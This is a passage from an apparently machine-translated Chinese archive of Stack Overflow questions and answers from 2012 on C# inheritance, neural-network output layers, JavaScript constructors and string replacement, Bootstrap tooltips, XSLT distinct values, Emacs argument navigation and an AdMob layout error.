顺便说一句，转换回列表不是必须的。这取决于您需要对集合做什么。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-26T20:44:46.157

你可以这样做，传递一个`List<Car>`包含`Ford`:s 例如：

```
public void Test()
{
    // This works:
    var fords = new List<Car> {new Ford()};
    FixCars(fords);

    // This does not work (since you cannot pass non car-typed list):
    // var mustangs = new List<Ford> {new Ford()};
    // FixCars(fords);
}

public void FixCars(List<Car> cars)
{
    // Do stuff, for example check actual type and do specialized things:
    foreach (var car in cars)
    {
        var ford = car as Ford;
        if (ford != null)
            ford.Honk();
    }
}

public class Car 
{    
}

public class Ford : Car
{
    public void Honk() {}
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-26T20:43:56.000

如果您只打算访问`Car`类中的方法和属性，则没有理由传递`Mustangs`. 相反，您应该`Mustangs`像对待他们一样对待您的`Cars`。这是继承的要点之一。您可以简单地创建汽车类型列表，`List<Car>`然后将您的添加`Mustangs`到其中。然后传递 type 的列表`Car`。这更具可扩展性，因为它可以接受任何继承自的对象，`Car`并且因为您只使用它的属性/方法，`Car`所以您需要的定义非常严格。

如果您想要`Mustang`类中的特定行为，但需要一个用于调用该行为的通用接口，请在中定义方法，`Car`然后在中覆盖它`Mustang`。同样，这更具可扩展性，因为当您创建一个`NineEleven`类时，您还可以覆盖此方法，从而在子类中为您提供不同的行为，而无需实际公开它们的类型。

# classification - 你可以在不使用 softmax 的情况下在神经网络中使用多个输出层吗？

> ID：13572722
> 
> 赞同：3
> 
> 时间：2012-11-26T20:35:52.930
> 
> 标签：classification, neural-network

我正在为一个类项目实现一个神经网络，我只是想知道是否可以在不使用 softmax 的情况下使用神经网络进行多类分类？当我向 TA 询问这个问题时，他说拥有多个输出层在数学上并不合理，但后来我看到 Andrew Ng 在他关于自动编码器的 UFLDL 教程中包含了一张具有多个输出的神经网络的图片，然后我看到了很多的人在谈论神经网络的多类分类而没有提到 softmax。所以我想我想知道的是在不使用softmax的情况下使用多个输出层是否合适，如果合适，你将如何做以及如何解释结果。

UFLDL 链接：[http ://ufldl.stanford.edu/wiki/index.php/UFLDL_Tutorial](http://ufldl.stanford.edu/wiki/index.php/UFLDL_Tutorial)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-05-07T10:11:41.450

很晚了，但也许有人会发现它很有用：

您不必使用 softmax 层。例如，您可以使用多个逻辑回归层或具有多个逻辑回归输出的单层。不同之处在于，softmax 表示带类是最可能的，而多个逻辑回归输出可以同时将一个数据点分配给多个类。

另一种方法是在神经网络输出值（即特征）上使用任意分类器（SVM、随机森林、Boosting）。

我最近忘记在卷积神经网络上放置一个 softmax 层，我使用了一个全连接（内积）层作为输出，结果也非常好！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-08-23T08:33:45.913

神经网络也可以有多个输出单元。例如，这是一个网络，它有两个隐藏层 L2 和 L3 层，以及 L4 层中的两个输出单元：

[![http://ufldl.stanford.edu/tutorial/images/Network3322.png](../Images/b2d5e6aab57431f10375a7a3bc9e6f49.png)](https://i.stack.imgur.com/gCxM2.png)

您可以查看本教程的更多详细信息：http: [//ufldl.stanford.edu/tutorial/supervised/MultiLayerNeuralNetworks/](http://ufldl.stanford.edu/tutorial/supervised/MultiLayerNeuralNetworks/)

# javascript - Object 在 JS 中返回其构造函数而不是 false。为什么？

> ID：13572727
> 
> 赞同：0
> 
> 时间：2012-11-26T20:36:20.520
> 
> 标签：javascript, arrays, oop, object

请帮助我修复我的脚本的工作。

```
function KittyFactory(kitty) // kitty constructor
{
    for (x in kitties)
    {
        if (kitties[x].color == kitty.color)
        {return false;} // if already in the array return false
    }
    return kitty; // else return the object itself
}

function iPreferDifferentKitties(kitty)
{
    if (new KittyFactory(kitty))
    {
        kitties[x].push(kitty);
    }
} 
```

但是如果这将`(kitties[x].color == kitty.color)`是一个空的构造函数（函数本身），而不是我想要的一个巨大的。`true``new KittyFactory(kitty)``FALSE`

我的问题基本上是我可以在我的小猫阵列中放置两只相同颜色的小猫。：（ 让我伤心。

你能帮我请我应该如何使用它？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T20:43:13.263

您不能`false`从构造函数返回。使用`new`运算符调用函数时，返回值必须是对象。如果您尝试返回其他内容，它的行为就好像没有`return`语句（并且默认返回新构造的对象）。

# javascript - 移动设备上的字符串 .replace() Javascript 函数不起作用

> ID：13572728
> 
> 赞同：1
> 
> 时间：2012-11-26T20:36:25.653
> 
> 标签：javascript, mobile

我有一段代码可以做一些谷歌分析。它看起来像这样：

```
$(function () { 
    $('.plan-choose-btn a').bind('click', function(e) {
        //ga load image
        <% String myaccGAEventUrl = trackGoogleAnalyticsEvent(request, "MO-22651379-1", "calltoaction", "buy", "PLC_HOLDER"); %>
        var action = '<%=myaccGAEventUrl%>';
        var hr = $(this).attr('href');
        var bundle = hr.split("id=")[1].split("&")[0];
        action = action.replace("PLC_HOLDER", bundle);
        $('body').append('<img src="'+action+'" width="1" height="1" />');
    });
}); 
```

如果我在桌面浏览器中调试它，我可以看到变量“action”得到更新，占位符文本被替换为正确的值。但我在我的 GA 仪表板上看到这在移动设备上没有发生，因为我看到了很多“PLC_HOLDER”事件标签。

字符串 .replace() 函数是否可能在手机上无法正常工作？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T20:52:42.377

该`replace`功能是在[JavaScript 1.2](http://web.archive.org/web/19990210100149/http://developer.netscape.com/docs/manuals/communicator/jsguide/restring.htm#1005652)中引入的，该版本自 1997 年以来一直存在。某些旧设备（阅读：浏览器）可能不完全支持 JavaScript 的某些功能。

我会在谷歌分析中查看哪些设备/浏览器让`PLC_HOLDER`字符串通过，这可能会告诉你是否需要更改生产代码以使用除`replace`处理这些设备的函数之外的其他东西，或者你是否可以安全地忽略这些设备。

# javascript - 关于悬停和聚焦的 Twitter 引导工具提示

> ID：13572737
> 
> 赞同：9
> 
> 时间：2012-11-26T20:36:58.090
> 
> 标签：javascript, twitter-bootstrap, tooltip

Twitter 引导工具提示触发器默认为悬停。

我可以添加 data-trigger="focus" 以使工具提示显示在焦点上，但是我如何同时进行悬停和焦点？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-26T20:48:42.543

你有没有尝试过`data-trigger="focus hover"`

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2014-01-17T13:06:44.477

@Adrian 的解决方案不适用于 Bootstrap 3。使用以下内容：

```
$('[rel=tooltip]').tooltip();
$(document).on('hover', '[rel=tooltip]', function () { $(this).tooltip('show'); });
$(document).on('focus', '[rel=tooltip]', function () { $(this).tooltip('show'); }); 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-11-27T20:23:30.950

`trigger`是一个单值属性，所以你必须伪造两种方法中的任何一种：

```
$('.tooltip').tooltip({trigger: 'hover'}).each(function () {
  var $this = $(this), data = $this.data('tooltip');
  $this.on('focus.tooltip', $.proxy(data.enter, data))
    .on('blur.tooltip', $.proxy(data.leave, data));
}); 
```

更新：或者，您可以使用我的 Twitter Bootstrap[补丁](https://github.com/twitter/bootstrap/pull/6040)来创建`trigger`一个多值属性并将其设置为`hover focus`.

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2017-10-24T18:26:09.913

您可以简单地传递**触发**参数：

```
$('[data-toggle="tooltip"]').tooltip({ trigger:'hover focus' }); 
```

[请参阅引导工具提示文章](https://getbootstrap.com/docs/3.3/javascript/#tooltips-examples)

# xml - 使用 XSLT 函数从序列中区分值

> ID：13572738
> 
> 赞同：1
> 
> 时间：2012-11-26T20:37:03.360
> 
> 标签：xml, xslt, transform

我试图在 XSLT 中获取自定义生成的字符串序列的唯一值。手头的问题很不寻常，因为我必须先在 '.' 上拆分一个字符串。最后一点，这工作正常，但使用 XSLT 2.0 distinct-values 获取唯一值不是。

给定一些输入

```
<TreeNumberList>
  <TreeNumber>A01.001.001</TreeNumber>  
  <TreeNumber>A01.001.002</TreeNumber>  
  <TreeNumber>A01.001.003</TreeNumber>
  <TreeNumber>A01.002.111</TreeNumber>
</TreeNumberList> 
```

所需的输出将是一个可迭代的序列

```
A01.001, A01.002 
```

到目前为止，我有以下功能

```
<xsl:function name="func:strip-last">
    <xsl:param name="str"></xsl:param>
    <xsl:value-of select="substring($str, 1, string-length($str) - 1)"></xsl:value-of>
</xsl:function>

<xsl:function name="func:parent-of">
    <xsl:param name="nodes"></xsl:param>
    <xsl:variable name="output">
    <xsl:for-each select="$nodes">
        <xsl:variable name="parent">
            <xsl:for-each select="tokenize(., '\.')">
                <xsl:if test="position() != last()">
                    <xsl:value-of select="."></xsl:value-of>
                    <xsl:text>.</xsl:text>
                </xsl:if>
            </xsl:for-each>
        </xsl:variable>
        <tmp><xsl:value-of select="func:strip-last($parent))"></xsl:value-of></tmp>
    </xsl:for-each>    
    </xsl:variable>
    <xsl:sequence select="distinct-values($output/*)"></xsl:sequence>
</xsl:function> 
```

但这不会返回一组不同的元素，而是所有涉及的元素的序列。最终的代码会有点做作，因为 TreeNumbers 本身不是唯一的，但通过键查找检索到的某个名称将是唯一的。（对于那些识别标记的人，它是 MeSH XML 的一部分）

我还尝试使用键索引或分组方式来实现唯一性，但这些与文档片段的配合并不好。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T22:26:40.447

以下表达式将一组不同的值作为字符串序列给出：

```
distinct-values(TreeNumber/replace(., '\..*$', '')) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-26T21:50:12.803

你必须有功能吗？你能创建一个具有序列的变量吗？

例子...

**XML 输入**

```
<TreeNumberList>
    <TreeNumber>A01.001.001</TreeNumber>  
    <TreeNumber>A01.001.002</TreeNumber>  
    <TreeNumber>A01.001.003</TreeNumber>
    <TreeNumber>A01.002.111</TreeNumber>
</TreeNumberList> 
```

**XSLT 2.0**

```
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:output indent="yes"/>
    <xsl:strip-space elements="*"/>

    <xsl:variable name="vAllTreeNumbers">
        <xsl:for-each select="/*/TreeNumber">
            <xsl:analyze-string select="." regex="(.*)\.[^.]*$">
                <xsl:matching-substring>
                    <xsl:value-of select="concat(regex-group(1),' ')"/>
                </xsl:matching-substring>
            </xsl:analyze-string>
        </xsl:for-each>
    </xsl:variable>
    <xsl:variable name="vUniqueTreeNumbers" select="distinct-values(tokenize(normalize-space($vAllTreeNumbers),' '))"/>

    <xsl:template match="/">
        <results>
            <!--This demonstrates that each value is part of a sequence.-->
            <xsl:for-each select="$vUniqueTreeNumbers">
                <item>
                    <xsl:value-of select="."/>
                </item>
            </xsl:for-each>
        </results>
    </xsl:template>

</xsl:stylesheet> 
```

**XML 输出**（只是为了演示顺序）

```
<results>
   <item>A01.001</item>
   <item>A01.002</item>
</results> 
```

这是另一个返回相同结果的选项...

**XSLT 2.0**

```
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
    xmlns:local="local"
    xmlns:xs="http://www.w3.org/2001/XMLSchema" exclude-result-prefixes="#all">
    <xsl:output indent="yes"/>
    <xsl:strip-space elements="*"/>

    <xsl:function name="local:getUniqueTreeNumbers">
        <xsl:param name="pNodes"/>
        <xsl:variable name="vAllTreeNumbers">
            <xsl:for-each select="$pNodes">
                <xsl:analyze-string select="." regex="(.*)\.[^.]*$">
                    <xsl:matching-substring>
                        <xsl:value-of select="concat(regex-group(1),' ')"/>
                    </xsl:matching-substring>
                </xsl:analyze-string>
            </xsl:for-each>
        </xsl:variable>
        <xsl:sequence select="distinct-values(tokenize(normalize-space($vAllTreeNumbers),' '))"></xsl:sequence>
    </xsl:function>

    <xsl:template match="/">
        <results>
            <!--This demonstrates that each value is part of an iterable sequence.-->
            <xsl:for-each select="local:getUniqueTreeNumbers(*/TreeNumber)">
                <item>
                    <xsl:value-of select="."/>
                </item>
            </xsl:for-each>         
        </results>
    </xsl:template>

</xsl:stylesheet> 
```

# emacs - 通过参数列表移动

> ID：13572739
> 
> 赞同：3
> 
> 时间：2012-11-26T20:37:09.093
> 
> 标签：emacs, elisp, cc-mode

我是一名 C++ 程序员，使用的设置包括当然`cc-mode`还有`CEDET`我们心爱的 emacs (v24.2)。

我缺少的一个功能是一个通过参数列表快速移动点的函数。考虑这个例子：

```
void takesManyArgs( int a1, int a2, int a3, std::pair<int,int> a4, int a5 ){  
    // does something nifty!  
}  
// [...]
takesManyArgs( b1, b2, b3, make_pair( b4, b5 ), b6 ); 
```

其中点就在第一个之前`int`。现在我想要一种简单的方法来快速浏览参数列表，即一个`forward-argument`（`backward-argument`以及）在第一个非空白字符之前移动到逗号（参数分隔符）之前的函数。
我已经编写了一个小函数来完成它，但它并不是我想要的工作方式：

```
(defun arg-forward ()  
  "Move point forward in the file until we hit an argument separator, i.e. comma, colon or semicolon."  
  (interactive)  
  (progn  
    (re-search-forward "[,]"))) 
```

原则上，这个函数只是跳转到下一个逗号。这不是我想要的行为。

我想要一个功能：

*   **编辑：**跳转到下一个参数分隔符（即 C++ 的逗号）并将点放在该参数分隔符之后
*   检查逗号后是否有空格；如果有一个，点将移动到第一个非空白字符（即，而不是`,| int`它看起来像标记指向 的`, |int`位置）`|`
*   在参数列表的末尾停止并打印一条消息（例如“在参数列表的末尾”）
*   停留在它的“范围”内，即它会从标记指向 `|int b3`的`|make_pair( int b4, int b5 )`地方`|int a6`到达`|`

`elisp`感谢您“黑客”的任何帮助！

**编辑：**添加了一些说明。
**Edit2：**修复了该示例“代码”

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-26T20:53:22.263

此功能似乎可以满足您的要求：

```
(defun arg-forward ()
  "Move point forward until we hit an argument separator, the comma, colon, semicolon"
  (interactive)
  (condition-case nil
      (let ((separator-regexp "[,:;]"))
        (forward-sexp)
        (while (not (or (looking-at (format "[ \t]*%s" separator-regexp))
                        (save-excursion (forward-char -1)
                                        (looking-at (format "[]\"')}]*[ \t]*%s " separator-regexp)))))
          (forward-sexp))
        (if (looking-at separator-regexp)
            (forward-char 1))
        ;; going forward one sexp and back puts point at front of sexp
        ;; essentially skipping the whitespace, but also ensuring we don't
        ;; jump out of a larger closing set of parentheses 
        (forward-sexp)
        (forward-sexp -1))
    (error
     (beep)
     (message "At end of argument list")))) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-26T20:56:28.620

您可以编写一个函数，使用`forward-sexp`并检查您是否处于“参数分隔符”或“参数列表结尾”之一。

我现在似乎没有手边的 emacs，所以我不能简单地检查示例实现，但是有了手头的那些，你应该一切顺利。

以下未经测试的代码：

```
(defun forward-argument ()
  (interactive)
  (let ((argument-terminator "[),]"))              ;; Arguments stop at commas or close
     (while (not (looking-at argument-terminator)) ;; until we're at end-of-argument...
        (forward-sexp 1))))                        ;; move forward 
```

这可能会受益于将参数终止符拉出到 defvar 中，因此很容易使其特定于模式。它可能会受益于具有计数前缀（将其包装在 (while (> count 0) ... (setq count (1- count)) 中，如果没有给出前缀则默认计数为 1）和其他一些东西。 , 更不用说根据实时 emacs 实际检查代码，而不是试图记住函数采用什么参数以及它们被称为什么。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-28T00:53:23.750

由于您在 C++ 代码中使用 CEDET，因此您可以利用 TAG 导航命令。我使用 CEDET bzr 存储库中的 CEDET 版本进行了尝试。

检查开发菜单，靠近底部的是导航标签。您将在以下位置找到前进/后退标签的键绑定：

`C-c , n` - 下一个标签

`C-c , p` - 上一个标签

这些将使您在函数之间、参数之间以及各种事物之间移动。

这些功能并不能完成您所询问的所有事情，但它们是一个好的开始。

# android - adview add 实例化失败？

> ID：13572743
> 
> 赞同：0
> 
> 时间：2012-11-26T20:37:32.690
> 
> 标签：android, android-layout, admob

这是我在我看来如何使用它

```
<ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:ads="http://schemas.android.com/apk/lib/com.google.ads"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:isScrollContainer="true"
    android:overScrollMode="always"
    android:scrollbarAlwaysDrawVerticalTrack="true"
    android:scrollbarStyle="outsideOverlay"
    android:scrollbars="vertical" >

    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="fill_parent"
        android:orientation="vertical"
        android:scrollbars="horizontal|vertical" >

        <LinearLayout
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:background="#7db121"
            android:orientation="vertical" >

            <RelativeLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content" >

                <TextView
                    android:id="@+id/batmanDName"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:gravity="center"
                    android:text="Name"
                    android:textAppearance="?android:attr/textAppearanceLarge"
                    android:textColor="#FFFFFF" />

                <ImageView
                    android:id="@+id/imageView1"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_alignParentRight="true"
                    android:layout_alignParentTop="true"
                    android:src="@drawable/runswhite2" />
            </RelativeLayout>

            <TextView
                android:id="@+id/batDteam"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:text="Team"
                android:textColor="#FFFFFF" />
        </LinearLayout>

        <LinearLayout
            android:layout_width="match_parent"
            android:layout_height="match_parent"
            android:orientation="vertical"
            android:paddingLeft="@android:dimen/app_icon_size"
            android:paddingRight="@android:dimen/app_icon_size"
            android:paddingTop="@android:dimen/app_icon_size" >

            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:layout_weight="1"
                android:orientation="horizontal" >

                <TextView
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight=".90"
                    android:text="Runs" />

                <TextView
                    android:id="@+id/batmanDRuns"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight=".10"
                    android:text="Runs" />
            </LinearLayout>

            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:layout_weight="1"
                android:orientation="horizontal" >

                <TextView
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight=".90"
                    android:text="Matches" />

                <TextView
                    android:id="@+id/batsmanDmatch"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight=".10"
                    android:text="matches" />
            </LinearLayout>

            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:layout_weight="1"
                android:orientation="horizontal" >

                <TextView
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight=".90"
                    android:text="Innings" />

                <TextView
                    android:id="@+id/batsmanDInns"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight=".10"
                    android:text="Innings" />
            </LinearLayout>

            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:layout_weight="1"
                android:orientation="horizontal" >

                <TextView
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight=".90"
                    android:text="High Score" />

                <TextView
                    android:id="@+id/batsmanDHighScore"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight=".10"
                    android:text="High Scores" />
            </LinearLayout>

            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:layout_weight="1"
                android:orientation="horizontal" >

                <TextView
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight=".90"
                    android:text="Strike Rate" />

                <TextView
                    android:id="@+id/batsmanDSr"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight=".10"
                    android:text="strike Rate" />
            </LinearLayout>

            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:layout_weight="1"
                android:orientation="horizontal" >

                <TextView
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight=".90"
                    android:text="Average" />

                <TextView
                    android:id="@+id/batDave"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight=".10"
                    android:text="Averege" />
            </LinearLayout>

            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:layout_weight="1"
                android:orientation="horizontal" >

                <TextView
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight=".90"
                    android:text="100&apos;s" />

                <TextView
                    android:id="@+id/hundreds"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight=".10"
                    android:text="100s" />
            </LinearLayout>

            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:layout_weight="1"
                android:orientation="horizontal" >

                <TextView
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight=".90"
                    android:text="50&apos;s" />

                <TextView
                    android:id="@+id/fifty"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight=".10"
                    android:text="50s" />
            </LinearLayout>

            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:layout_weight="1"
                android:orientation="horizontal" >

                <TextView
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight=".90"
                    android:text="4&apos;s" />

                <TextView
                    android:id="@+id/batsman4s"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight=".10"
                    android:text="4s" />
            </LinearLayout>

            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:layout_weight="1"
                android:orientation="horizontal" >

                <TextView
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight=".90"
                    android:text="6&apos;s" />

                <TextView
                    android:id="@+id/batsman6s"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight=".10"
                    android:text="6s" />
            </LinearLayout>

            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:layout_weight="1"
                android:orientation="horizontal" >

                <TextView
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight=".90"
                    android:text="Ducks" />

                <TextView
                    android:id="@+id/bats0s"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight=".10"
                    android:text="Zeros" />
            </LinearLayout>

            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:layout_weight="1"
                android:orientation="horizontal" >

                <TextView
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight=".90"
                    android:text="Un Beaten" />

                <TextView
                    android:id="@+id/batsnot"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_weight=".10"
                    android:text="not out" />
            </LinearLayout>
        </LinearLayout>

        <LinearLayout
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:layout_weight="1"
            android:orientation="horizontal" >

            <TextView
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:text="                                      " />
        </LinearLayout>

        <RelativeLayout
            android:layout_width="fill_parent"
            android:layout_height="wrap_content" >

            <ImageView
                android:id="@+id/shareBat"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:layout_alignParentRight="true"
                android:layout_alignParentTop="true"
                android:layout_marginRight="126dp"
                android:onClick="shareBat"
                android:src="@drawable/sharebtn" />

            <ImageView
                android:id="@+id/cricInfoBat"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:layout_alignParentTop="true"
                android:layout_marginRight="24dp"
                android:layout_toLeftOf="@+id/shareBat"
                android:onClick="openCricInfo"
                android:src="@drawable/cricinfo" />

            <Button
                android:id="@+id/button1"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:layout_alignLeft="@+id/shareBat"
                android:layout_alignParentTop="true"
                android:layout_marginLeft="16dp"
                android:onClick="facebook"
                android:text="Facebook" />
        </RelativeLayout>

        <RelativeLayout
            android:layout_width="fill_parent"
            android:layout_height="fill_parent" >

            <com.google.ads.AdView
                android:id="@+id/adView"
                android:layout_width="fill_parent"
                android:layout_height="wrap_content"
                android:layout_alignParentBottom="true"
                android:layout_alignParentLeft="true"
                ads:adSize="SMART_BANNER"
                ads:adUnitId="a1508857970fc3c"
                android:gravity="center" />
        </RelativeLayout>
    </LinearLayout>

</ScrollView> 
```

这是这个程序的痕迹

```
> null
Error
Mon Nov 26 22:59:43 PKT 2012
com.google.ads.AdView failed to instantiate.

java.lang.UnsupportedOperationException
at com.android.layoutlib.bridge.android.BridgeContext.getApplicationContext(BridgeContext.java:1272)
at com.google.ads.AdView.a(SourceFile:169)
at com.google.ads.AdView.a(SourceFile:366)
at com.google.ads.AdView.<init>(SourceFile:129)
at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
at sun.reflect.NativeConstructorAccessorImpl.newInstance(Unknown Source)
at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(Unknown Source)
at java.lang.reflect.Constructor.newInstance(Unknown Source)
at com.android.ide.eclipse.adt.internal.editors.layout.ProjectCallback.instantiateClass(ProjectCallback.java:402)
at com.android.ide.eclipse.adt.internal.editors.layout.ProjectCallback.loadView(ProjectCallback.java:166)
at com.android.layoutlib.bridge.android.BridgeInflater.loadCustomView(BridgeInflater.java:205)
at com.android.layoutlib.bridge.android.BridgeInflater.createViewFromTag(BridgeInflater.java:133)
at android.view.LayoutInflater_Delegate.rInflate(LayoutInflater_Delegate.java:83)
at android.view.LayoutInflater.rInflate(LayoutInflater.java:702)
at android.view.LayoutInflater_Delegate.rInflate(LayoutInflater_Delegate.java:86)
at android.view.LayoutInflater.rInflate(LayoutInflater.java:702)
at android.view.LayoutInflater_Delegate.rInflate(LayoutInflater_Delegate.java:86)
at android.view.LayoutInflater.rInflate(LayoutInflater.java:702)
at android.view.LayoutInflater.inflate(LayoutInflater.java:479)
at android.view.LayoutInflater.inflate(LayoutInflater.java:367)
at com.android.layoutlib.bridge.impl.RenderSessionImpl.inflate(RenderSessionImpl.java:324)
at com.android.layoutlib.bridge.Bridge.createSession(Bridge.java:321)
at com.android.ide.common.rendering.LayoutLibrary.createSession(LayoutLibrary.java:325)
at com.android.ide.eclipse.adt.internal.editors.layout.gle2.RenderService.createRenderSession(RenderService.java:372)
at com.android.ide.eclipse.adt.internal.editors.layout.gle2.GraphicalEditorPart.renderWithBridge(GraphicalEditorPart.java:1638)
at com.android.ide.eclipse.adt.internal.editors.layout.gle2.GraphicalEditorPart.recomputeLayout(GraphicalEditorPart.java:1389)
at com.android.ide.eclipse.adt.internal.editors.layout.gle2.GraphicalEditorPart.activated(GraphicalEditorPart.java:1163)
at com.android.ide.eclipse.adt.internal.editors.layout.LayoutEditorDelegate.delegatePageChange(LayoutEditorDelegate.java:674)
at com.android.ide.eclipse.adt.internal.editors.common.CommonXmlEditor.pageChange(CommonXmlEditor.java:360)
at org.eclipse.ui.part.MultiPageEditorPart$2.widgetSelected(MultiPageEditorPart.java:290)
at org.eclipse.swt.widgets.TypedListener.handleEvent(TypedListener.java:234)
at org.eclipse.swt.widgets.EventTable.sendEvent(EventTable.java:84)
at org.eclipse.swt.widgets.Widget.sendEvent(Widget.java:1053)
at org.eclipse.swt.widgets.Widget.sendEvent(Widget.java:1077)
at org.eclipse.swt.widgets.Widget.sendEvent(Widget.java:1062
)at org.eclipse.swt.widgets.Widget.notifyListeners(Widget.java:774)
at org.eclipse.swt.custom.CTabFolder.setSelection(CTabFolder.java:2743)
at org.eclipse.swt.custom.CTabFolder.onMouse(CTabFolder.java:1429)
at org.eclipse.swt.custom.CTabFolder$1.handleEvent(CTabFolder.java:257)
at org.eclipse.swt.widgets.EventTable.sendEvent(EventTable.java:84)
at org.eclipse.swt.widgets.Widget.sendEvent(Widget.java:1053)
at org.eclipse.swt.widgets.Display.runDeferredEvents(Display.java:4066)
at org.eclipse.swt.widgets.Display.readAndDispatch(Display.java:3657)
at org.eclipse.ui.internal.Workbench.runEventLoop(Workbench.java:2640)
at org.eclipse.ui.internal.Workbench.runUI(Workbench.java:2604)
at org.eclipse.ui.internal.Workbench.access$4(Workbench.java:2438)
at org.eclipse.ui.internal.Workbench$7.run(Workbench.java:671)
at org.eclipse.core.databinding.observable.Realm.runWithDefault(Realm.java:332)
at org.eclipse.ui.internal.Workbench.createAndRunWorkbench(Workbench.java:664)
at org.eclipse.ui.PlatformUI.createAndRunWorkbench(PlatformUI.java:149)
at org.eclipse.ui.internal.ide.application.IDEApplication.start(IDEApplication.java:115)
at org.eclipse.equinox.internal.app.EclipseAppHandle.run(EclipseAppHandle.java:196)
at org.eclipse.core.runtime.internal.adaptor.EclipseAppLauncher.runApplication(EclipseAppLauncher.java:110)
at org.eclipse.core.runtime.internal.adaptor.EclipseAppLauncher.start(EclipseAppLauncher.java:79)
at org.eclipse.core.runtime.adaptor.EclipseStarter.run(EclipseStarter.java:369)
at org.eclipse.core.runtime.adaptor.EclipseStarter.run(EclipseStarter.java:179)
at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
at java.lang.reflect.Method.invoke(Unknown Source)
at org.eclipse.equinox.launcher.Main.invokeFramework(Main.java:620)
at org.eclipse.equinox.launcher.Main.basicRun(Main.java:575)
at org.eclipse.equinox.launcher.Main.run(Main.java:1408)
at org.eclipse.equinox.launcher.Main.main(Main.java:1384) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T21:15:59.013

确保您`AdActivity`在清单文件中声明了：

```
<activity android:name="com.google.ads.AdActivity"
      android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|uiMode|screenSize|smallestScreenSize"/> 
```

# javascript - 将 onclick 事件动态添加到锚标记，不起作用

> ID：13572749
> 
> 赞同：2
> 
